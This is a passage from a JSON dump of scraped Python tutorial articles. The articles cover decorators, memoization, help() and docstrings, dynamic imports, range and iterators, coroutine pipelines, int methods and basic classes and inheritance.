args:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0summ += arg\u00a0\u00a0\u00a0\u00a0return summ\u00a0\u00a0print(stringJoin(\"I \", 'like ', \"Geeks\", 'for', \"geeks\"))print()print(summation(19, 2, 8, 533, 67, 981, 119))Output:\u00a0\u00a0Decorator for 'stringJoin'\nDecorator for 'summation'\n\nstringJoin started ...\nI like Geeksforgeeks\n\nsummation started ...\n17291. Inside the Decorator\u00a0\u00a02. Inside the function\u00a0Note: Image snapshots are taken using PythonTutor.\u00a0My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "1afe4c0153f0f13356d22dafbcba2d71",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Recursion is a programming technique where a function calls itself repeatedly till a termination condition is met. Some of the examples where recursion is used are: calculation of fibonacci series, factorial etc. But the issue with them is that in the recursion tree, there can be chances that the sub-problem that is already solved is being solved again, which adds to an overhead.Memoization is a technique of recording the intermediate results so that it can be used to avoid repeated calculations and speed up the programs. It can be used to optimize the programs that use recursion. In Python, memoization can be done with the help of function decorators.\u00a0Let us take the example of calculating the factorial of a number. The simple program below uses recursion to solve the problem:\u00a0Python3# Simple recursive program to find factorialdef facto(num):\u00a0\u00a0\u00a0\u00a0if num == 1:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return 1\u00a0\u00a0\u00a0\u00a0else:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return num * facto(num-1)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(facto(5))The above program can be optimized by memoization using decorators.\u00a0Python3# Factorial program with memoization using# decorators.\u00a0# A decorator function for function 'f' passed# as parametermemory = {}def memoize_factorial(f):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# This inner function has access to memory\u00a0\u00a0\u00a0\u00a0# and 'f'\u00a0\u00a0\u00a0\u00a0def inner(num):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if num not in memory:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0memory[num] = f(num)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return memory[num]\u00a0\u00a0\u00a0\u00a0\u00a0return inner\u00a0\u00a0\u00a0\u00a0\u00a0@memoize_factorialdef facto(num):\u00a0\u00a0\u00a0\u00a0if num == 1:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return 1\u00a0\u00a0\u00a0\u00a0else:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return num * facto(num-1)\u00a0print(facto(5))Explanation:\u00a01. A function called memoize_factorial has been defined. It\u2019s main purpose is to store the intermediate results in the variable called memory.\u00a02. The second function called facto is the function to calculate the factorial. It has been annotated by a decorator(the function memoize_factorial). The facto has access to the memory variable as a result of the concept of closures.The annotation is equivalent to writing,\u00a0facto = memoize_factorial(facto)3. When facto(5) is called, the recursive operations take place in addition to the storage of intermediate results. Every time a calculation needs to be done, it is checked if the result is available in memory. If yes, then it is used, else, the value is calculated and is stored in memory.\u00a04. We can verify the fact that memoization actually works, please see output of this program.\u00a0My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "ad02f3a531e012efdb0c3dd99203c7f6",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "The Python help function is used to display the documentation of modules, functions, classes, keywords, etc.\u00a0The help function has the following syntax:help([object])Python help() function argumentsobject: Call help of the given object.If the help function is passed without an argument, then the interactive help utility starts up on the console.Python help() ExampleLet us check the documentation of the print function in the python console.\u00a0Python3help(print)Output:Help on built-in function print in module builtins:\n\nprint(...)\n    print(value, ..., sep=' ', end='\\n', file=sys.stdout, flush=False)\n\n    Prints the values to a stream, or to sys.stdout by default.\n    Optional keyword arguments:\n    file:  a file-like object (stream); defaults to the current sys.stdout.\n    sep:   string inserted between values, default a space.\n    end:   string appended after the last value, default a newline.\n    flush: whether to forcibly flush the stream.Help function output can also be defined for user-defined functions and classes. The docstring(documentation string) is used for documentation. It is nested inside triple quotes and is the first statement within a class or function or a module.Let us define a class with functions:\u00a0Python3class Helper:\u00a0\u00a0\u00a0\u00a0def __init__(self):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'''The helper class is initialized'''\u00a0\u00a0\u00a0\u00a0\u00a0def print_help(self):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'''Returns the help description'''\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print('helper description')\u00a0\u00a0help(Helper)help(Helper.print_help)On running the above program, we get the output of the first help function as shown below:\u00a0\u00a0Help on class Helper in module __main__:\n\nclass Helper(builtins.object)\n |  Methods defined here:\n |  \n |  __init__(self)\n |      The helper class is initialized\n |  \n |  print_help(self)\n |      Returns the help description\n |  \n |  ----------------------------------------------------------------------\n |  Data descriptors defined here:\n |  \n |  __dict__\n |      dictionary for instance variables (if defined)\n |  \n |  __weakref__\n |      list of weak references to the object (if defined)\n\nHelp on function print_help in module __main__:\n\nprint_help(self)\n    Returns the help descriptionPython help() function docstringThe docstrings are declared using \u201d\u2019triple single quotes\u201d\u2019 or \u201c\u201d\u201dtriple double quotes\u201d\u201d\u201d just below the class, method or function declaration. All functions should have a docstring.Accessing Docstrings: The docstrings can be accessed using the __doc__ method of the object or using the help function.Python3def my_function():\u00a0\u00a0\u00a0\u00a0'''Demonstrates triple double quotes\u00a0\u00a0\u00a0\u00a0docstrings and does nothing really.'''\u00a0\u00a0\u00a0\u00a0\u00a0return None\u00a0print(\"Using __doc__:\")print(my_function.__doc__)\u00a0print(\"Using help:\")help(my_function)Output:Using __doc__:\nDemonstrates triple double quotes\n    docstrings and does nothing really.\nUsing help:\nHelp on function my_function in module __main__:\n\nmy_function()\n    Demonstrates triple double quotes\n    docstrings and does nothing really.My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "06316b80698eac800f2dc58b2bf5aa75",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "While writing a code, there might be a need for some specific modules. So we import those modules by using a single line code in Python.But what if the name of the module needed is known to us only during runtime? How can we import that module? One can use the Python\u2019s inbuilt __import__() function. It helps to import modules in runtime also.Syntax: __import__(name, globals, locals, fromlist, level)Parameters:name : Name of the module to be importedglobals and locals : Interpret namesformlist : Objects or submodules to be imported (as a list)level : Specifies whether to use absolute or relative imports. Default is -1(absolute and relative).Example #1 :# importing numpy module# it is equivalent to \"import numpy as np\"np = __import__('numpy', globals(), locals(), [], 0)\u00a0\u00a0# array from numpya = np.array([1, 2, 3])\u00a0\u00a0# prints the typeprint(type(a))Output :<class 'numpy.ndarray'>\u00a0Example #2 :Both the following statements has same meaning and does the same work.# from numpy import complex as comp, array as arrnp = __import__('numpy', globals(), locals(), ['complex', 'array'], 0)\u00a0\u00a0comp = np.complexarr = np.array\u00a0Application :__import__() is not really necessary in everyday Python programming. Its direct use is rare. But sometimes, when there is a need of importing modules during the runtime, this function comes quite handy.My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "c7a0fb2fba1a3e4f63e05fc605ff0439",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "range() : Python range function generates a list of numbers which are generally used in many situation for iteration as in for loop or in many other cases. In python range objects are not iterators. range is a class of a list of immutable objects. The iteration behavior of range is similar to iteration behavior of list in list and range we can not directly call next function. We can call next if we get an iterator using iter.# Python program to understand range# this creates a list of 0 to 5# integers\u00a0\u00a0demo = range(6)\u00a0\u00a0# print the demoprint(demo)\u00a0\u00a0# it will generate errorprint(next(demo))OUTPUT :\r\n range(0, 6)\r\nRuntime Errors :\r\n Traceback (most recent call last):\r\n  File \"/home/6881218331a293819d2a4c16029084f9.py\", line 13, in \r\n    print(next(demo))\r\nTypeError: list object is not an iterator\r\nNote : Above runtime error clearly indicates that python range is not a iterator.Because range is iterable so we can get a iterator with the help of them but we can not directly call next in next. Below example explains it clearly# Python program to understand range\u00a0\u00a0# creates an iteratordemo = iter(range(6))\u00a0\u00a0# print iteratorprint(demo)\u00a0\u00a0# use nextprint(next(demo))OUTPUT :\r\n<listiterator object at 0x7f3f32a46450 >\r\n0\r\nrange does not generates all numbers that it contains when we create it. It gives only those numbers which we get them using loop. range has following properties.range objects are immutable means that they can not be changed again so they can be used as index in dictionaries.They have start stop and step arguments .same range can be visit again and againExample# Python program to understand range\u00a0\u00a0# creates a demo rangedemo = range(1, 31, 2)\u00a0\u00a0# print the rangeprint(demo)\u00a0\u00a0# print the start of rangeprint(demo.start)\u00a0\u00a0# print step of rangeprint(demo.step)\u00a0\u00a0# print the index of element 23print(demo.index(23))\u00a0\u00a0# since 30 is not present it will give errorprint(demo.index(30))OUTPUT :\r\nrange(1, 31, 2)\r\n1\r\n2\r\n11\r\nRuntime Error : Since element 30 is not present it will rise an error\r\n Traceback (most recent call last):\r\n  File \"/home/cddaae6552d1d9288d7c5ab503c54642.py\", line 19, in \r\n    print(demo.index(30))\r\nValueError: 30 is not in range\r\nMy Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "eb7acd28355eec911a809372fb903642",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Prerequisite: GeneratorsWe all are familiar with function which is also known as a subroutine, procedure, sub-process, etc. A function is a sequence of instructions packed as a unit to perform a certain task. When the logic of a complex function is divided into several self-contained steps that are themselves functions, then these functions are called helper functions or subroutines.Subroutines in Python are called by the main function which is responsible for coordinating the use of these subroutines. Subroutines have a single entry point.\u00a0Coroutines are generalizations of subroutines. They are used for cooperative multitasking where a process voluntarily yield (give away) control periodically or when idle in order to enable multiple applications to be run simultaneously. The difference between coroutine and subroutine is :\u00a0\u00a0Unlike subroutines, coroutines have many entry points for suspending and resuming execution. Coroutine can suspend its execution and transfer control to other coroutine and can resume again execution from the point it left off.Unlike subroutines, there is no main function to call coroutines in a particular order and coordinate the results. Coroutines are cooperative that means they link together to form a pipeline. One coroutine may consume input data and send it to other that process it. Finally, there may be a coroutine to display the result.Coroutine Vs ThreadNow you might be thinking how coroutine is different from threads, both seem to do the same job.\u00a0In the case of threads, it\u2019s an operating system (or run time environment) that switches between threads according to the scheduler. While in the case of a coroutine, it\u2019s the programmer and programming language which decides when to switch coroutines. Coroutines work cooperatively multitask by suspending and resuming at set points by the programmer.\u00a0\u00a0Python CoroutineIn Python, coroutines are similar to generators but with few extra methods and slight changes in how we use yield statements. Generators produce data for iteration while coroutines can also consume data.\u00a0In Python 2.5, a slight modification to the yield statement was introduced, now yield can also be used as an expression. For example on the right side of the assignment \u2013\u00a0line = (yield)whatever value we send to coroutine is captured and returned by (yield) expression.\u00a0A value can be sent to the coroutine by send() method. For example, consider this coroutine which prints out the name having the prefix \u201cDear\u201d in it. We will send names to coroutine using send() method.\u00a0Python3# Python3 program for demonstrating# coroutine execution\u00a0def print_name(prefix):\u00a0\u00a0\u00a0\u00a0print(\"Searching prefix:{}\".format(prefix))\u00a0\u00a0\u00a0\u00a0while True:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0name = (yield)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if prefix in name:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(name)\u00a0# calling coroutine, nothing will happencorou = print_name(\"Dear\")\u00a0# This will start execution of coroutine and# Prints first line \"Searching prefix...\"# and advance execution to the first yield expressioncorou.__next__()\u00a0# sending inputscorou.send(\"Atul\")corou.send(\"Dear Atul\")Output:\u00a0Searching prefix:Dear\nDear AtulExecution of CoroutineThe execution of the coroutine is similar to the generator. When we call coroutine nothing happens, it runs only in response to the next() and sends () method. This can be seen clearly in the above example, as only after calling __next__() method, our coroutine starts executing. After this call, execution advances to the first yield expression, now execution pauses and waits for the value to be sent to corou object. When the first value is sent to it, it checks for prefix and print name if prefix present. After printing the name, it goes through the loop until it encounters the name = (yield) expression again.\u00a0\u00a0Closing a CoroutineCoroutine might run indefinitely, to close coroutine close() method is used. When a coroutine is closed it generates GeneratorExit exception which can be caught in the caught usual way. After closing the coroutine, if we try to send values, it will raise the StopIteration exception. Following is a simple example :\u00a0Python3# Python3 program for demonstrating# closing a coroutine\u00a0def print_name(prefix):\u00a0\u00a0\u00a0\u00a0print(\"Searching prefix:{}\".format(prefix))\u00a0\u00a0\u00a0\u00a0try :\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0while True:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0name = (yield)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if prefix in name:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(name)\u00a0\u00a0\u00a0\u00a0except GeneratorExit:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\"Closing coroutine!!\")\u00a0corou = print_name(\"Dear\")corou.__next__()corou.send(\"Atul\")corou.send(\"Dear Atul\")corou.close()Output:\u00a0Searching prefix:Dear\nDear Atul\nClosing coroutine!!Chaining coroutines for creating pipelineCoroutines can be used to set pipes. We can chain together coroutines and push data through the pipe using send() method. A pipe needs :\u00a0\u00a0An initial source(producer) derives the whole pipeline. The producer is usually not a coroutine, it\u2019s just a simple method.A sink, which is the endpoint of the pipe. A sink might collect all data and display it.Following is a simple example of chaining \u2013\u00a0Python3# Python3 program for demonstrating# coroutine chaining\u00a0def producer(sentence, next_coroutine):\u00a0\u00a0\u00a0\u00a0'''\u00a0\u00a0\u00a0\u00a0Producer which just split strings and\u00a0\u00a0\u00a0\u00a0feed it to pattern_filter coroutine\u00a0\u00a0\u00a0\u00a0'''\u00a0\u00a0\u00a0\u00a0tokens = sentence.split(\" \")\u00a0\u00a0\u00a0\u00a0for token in tokens:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0next_coroutine.send(token)\u00a0\u00a0\u00a0\u00a0next_coroutine.close()\u00a0def pattern_filter(pattern=\"ing\", next_coroutine=None):\u00a0\u00a0\u00a0\u00a0'''\u00a0\u00a0\u00a0\u00a0Search for pattern in received token\u00a0\u00a0\u00a0\u00a0and if pattern got matched, send it to\u00a0\u00a0\u00a0\u00a0print_token() coroutine for printing\u00a0\u00a0\u00a0\u00a0'''\u00a0\u00a0\u00a0\u00a0print(\"Searching for {}\".format(pattern))\u00a0\u00a0\u00a0\u00a0try:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0while True:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0token = (yield)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if pattern in token:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0next_coroutine.send(token)\u00a0\u00a0\u00a0\u00a0except GeneratorExit:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\"Done with filtering!!\")\u00a0def print_token():\u00a0\u00a0\u00a0\u00a0'''\u00a0\u00a0\u00a0\u00a0Act as a sink, simply print the\u00a0\u00a0\u00a0\u00a0received tokens\u00a0\u00a0\u00a0\u00a0'''\u00a0\u00a0\u00a0\u00a0print(\"I'm sink, i'll print tokens\")\u00a0\u00a0\u00a0\u00a0try:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0while True:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0token = (yield)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(token)\u00a0\u00a0\u00a0\u00a0except GeneratorExit:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\"Done with printing!\")\u00a0pt = print_token()pt.__next__()pf = pattern_filter(next_coroutine = pt)pf.__next__()\u00a0sentence = \"Bob is running behind a fast moving car\"producer(sentence, pf)Output:\u00a0I'm sink, i'll print tokens\nSearching for ing\nrunning\nmoving\nDone with filtering!!\nDone with printing!References\u00a0http://www.dabeaz.com/coroutines/Coroutines.pdfhttps://en.wikipedia.org/wiki/CoroutineThis article is contributed by Atul Kumar. If you like GeeksforGeeks and would like to contribute, you can also write an article using write.geeksforgeeks.org or mail your article to review-team@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above.\u00a0My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "6e575db7930fe292710d3fcee91a01cb",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "The int type implements the numbers.Integral abstract base class.1. int.bit_length()Returns the number of bits required to represent an integer in binary, excluding the sign and leading zeros.Code to demonstratenum = 7print(num.bit_length())\u00a0\u00a0num = -7print(num.bit_length())Output:\r\n3\r\n3\r\n2. int.to_bytes(length, byteorder, *, signed=False)Return an array of bytes representing an integer.If byteorder is \u201cbig\u201d, the most significant byte is at the beginning of the byte array. If byteorder is \u201clittle\u201d, the most significant byte is at the end of the byte array. The signed argument determines whether two\u2019s complement is used to represent the integer.# Returns byte representation of 1024 in a# big endian machine.print((1024).to_bytes(2, byteorder ='big'))Output:\r\nb'\\x04\\x00'\r\n3. int.from_bytes(bytes, byteorder, *, signed=False)Returns the integer represented by the given array of bytes.# Returns integer value of '\\x00\\x10' in big endian machine.print(int.from_bytes(b'\\x00\\x10', byteorder ='big'))Output:\r\n16\r\nMy Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "62887518aa38c99cbb9d5acfcd3a4e42",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "After going through the basics of python, you would be interested to know more about further and bit more advance topics of the Python3 programming language.This article covers them.Please remember that Python completely works on indentation and it is advised to practice it a bit by running some programs. Use the tab key to provide indentation to your code.This article is divided in following five sections:ClassesJust like every other Object Oriented Programming language Python supports classes. Let\u2019s look at some points on Python classes.Classes are created by keyword class.Attributes are the variables that belong to class.Attributes are always public and can be accessed using dot (.) operator. Eg.: Myclass.MyattributeA sample E.g for classes:# creates a class named MyClassclass MyClass:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# assign the values to the MyClass attributes\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0number = 0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0name = \"noname\"\u00a0\u00a0def Main():\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Creating an object of the MyClass.\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Here, 'me' is the object\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0me = MyClass()\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Accessing the attributes of MyClass\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# using the dot(.) operator\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0me.number = 1337\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0me.name = \"Harssh\"\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# str is an build-in function that\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# creates an string\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(me.name + \" \" + str(me.number))\u00a0\u00a0\u00a0\u00a0\u00a0# telling python that there is main in the program.if __name__=='__main__':\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Main()Output :Harssh 1337\r\nMethodsMethod is a bunch of code that is intended to perform a particular task in your Python\u2019s code.Function that belongs to a class is called an Method.All methods require \u2018self\u2019 parameter. If you have coded in other OOP language you can think of \u2018self\u2019 as the \u2018this\u2019 keyword which is used for the current object. It unhides the current instance variable.\u2019self\u2019 mostly work like \u2018this\u2019.\u2018def\u2019 keyword is used to create a new method.# A Python program to demonstrate working of class# methods\u00a0\u00a0class Vector2D:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0x = 0.0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0y = 0.0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Creating a method named Set\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0def Set(self, x, y):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.x = x\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.y = y\u00a0\u00a0def Main():\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# vec is an object of class Vector2D\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0vec = Vector2D()\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Passing values to the function Set\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# by using dot(.) operator.\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0vec.Set(5, 6)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\"X: \" + str(vec.x) + \", Y: \" + str(vec.y))\u00a0\u00a0if __name__=='__main__':\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Main()Output :X: 5, Y: 6InheritanceInheritance is defined as a way in which a particular class inherits features from its base class.Base class is also knows as \u2018Superclass\u2019 and the class which inherits from the Superclass is knows as \u2018Subclass\u2019As shown in the figure the Derived class can inherit features from its base class, also it can define its own features too.# Syntax for inheritance\u00a0\u00a0class derived-classname(superclass-name)# A Python program to demonstrate working of inheritanceclass Pet:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0#__init__ is an constructor in Python\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0def __init__(self, name, age):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.name = name\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.age = age\u00a0\u00a0# Class Cat inheriting from the class Petclass Cat(Pet):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0def __init__(self, name, age):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# calling the super-class function __init__\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# using the super() function\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0super().__init__(name, age)\u00a0\u00a0\u00a0def Main():\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0thePet = Pet(\"Pet\", 1)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0jess = Cat(\"Jess\", 3)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# isinstance() function to check whether a class is\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# inherited from another class\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\"Is jess a cat? \" +str(isinstance(jess, Cat)))\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\"Is jess a pet? \" +str(isinstance(jess, Pet)))\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\"Is the pet a cat? \"+str(isinstance(thePet, Cat)))\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\"Is thePet a Pet? \" +str(isinstance(thePet, Pet)))\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(jess.name)\u00a0\u00a0if __name__=='__main__':\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Main()Output :Is jess a cat? True\r\nIs jess a pet? True\r\nIs the pet a cat? False\r\nIs thePet a Pet? True\r\nJess\r\nIteratorsIterators are objects that can be iterated upon.Python uses the __iter__() method to return an iterator object of the class.The iterator object then uses the __next__() method to get the next item.for loops stops when StopIteration Exception is raised.# This program will reverse the string that is passed# to it from the main functionclass Reverse:\u00a0\u00a0\u00a0\u00a0def __init__(self, data):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.data = data\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.index = len(data)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0def __iter__(self):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return self\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0def __next__(self):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if self.index == 0:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0raise StopIteration\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.index-= 1\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return self.data[self.index]\u00a0\u00a0def Main():\u00a0\u00a0\u00a0\u00a0rev = Reverse('Drapsicle')\u00a0\u00a0\u00a0\u00a0for char in rev:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(char)\u00a0\u00a0if __name__=='__main__':\u00a0\u00a0\u00a0\u00a0Main()Output :e\r\nl\r\nc\r\ni\r\ns\r\np\r\na\r\nr\r\nD\r\nGeneratorsAnother way of creating iterators.Uses a function rather than a separate classGenerates the background code for the next() and iter() methodsUses a special statement called yield which saves the state of the generator and set a resume point for when next() is called again.# A Python program to demonstrate working of Generatorsdef Reverse(data):\u00a0\u00a0\u00a0\u00a0# this is like counting from 100 to 1 by taking one(-1)\u00a0\u00a0\u00a0\u00a0\u00a0# step backward.\u00a0\u00a0\u00a0\u00a0for index in 